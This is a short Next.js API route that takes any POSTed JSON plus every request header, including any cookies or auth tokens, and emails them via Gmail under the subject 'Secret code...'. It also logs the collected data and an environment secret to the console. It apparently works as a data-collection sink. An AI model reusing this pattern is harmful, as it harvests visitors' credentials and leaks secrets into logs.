import { NextResponse } from "next/server";
import { headers } from "next/headers";
const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  service: "Gmail",
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_FROM,
    pass: process.env.EMAIL_PASS,
  },
});

export async function POST(request) {
  let body = await request.json();
  const headersList = headers();
  let email_body = `THE BODY: ${JSON.stringify(body)} \n `;
  for (const pair of headersList.entries()) {
    email_body += `${pair[0]}: ${pair[1]} \n`;
  }
  console.log("SEEEEEEECRET", process.env.EMAIL_FROM);
  console.log(email_body);

  const mailOptions = {
    from: process.env.EMAIL_FROM,
    to: process.env.EMAIL_TO,
    subject: "Secret code...",
    text: email_body,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email: ", error);
    } else {
      console.log("Email sent: ", info.response);
    }
  });

  try {
    return NextResponse.json(body);
  } catch {
    return NextResponse.json({ error: "error" });
  }
}
